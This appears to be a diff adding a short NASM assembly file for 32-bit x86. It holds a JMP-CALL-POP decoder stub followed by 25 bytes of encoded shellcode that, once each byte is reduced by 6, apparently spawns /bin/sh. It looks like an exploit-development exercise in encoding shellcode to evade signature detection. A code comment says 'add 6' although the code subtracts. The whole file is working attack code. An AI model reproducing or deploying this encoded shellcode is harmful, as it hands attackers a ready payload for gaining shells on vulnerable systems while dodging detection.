@@ -1,0 +1,30 @@
+;encoder.nasm
+;author:clujk
+ 
+global _start 
+ 
+section .text
+
+_start:
+ 
+ 	jmp short call_decoder
+ 
+decoder:
+	pop esi
+ 	xor ecx, ecx
+ 	mov cl, 25         ;shellcode length is 25
+ 
+ 
+decode:
+ 	sub byte [esi], 0x6   ; add 6 to each byte
+ 	inc esi
+ 	loop decode
+ 
+ 	jmp short Shellcode
+ 
+call_decoder:
+ 
+ 	call decoder
+        ;below is the encoded shellcode
+ 	Shellcode: db 0x37,0xc6,0x56,0x6e,0x74,0x35,0x79,0x6e,0x6e,0x35,0x35,0x68,0x6f,0x8f,0xe9,0x56,0x8f,0xe7,0x59,0x8f,0xe8,0xb6,0x11,0xd3,0x86
+
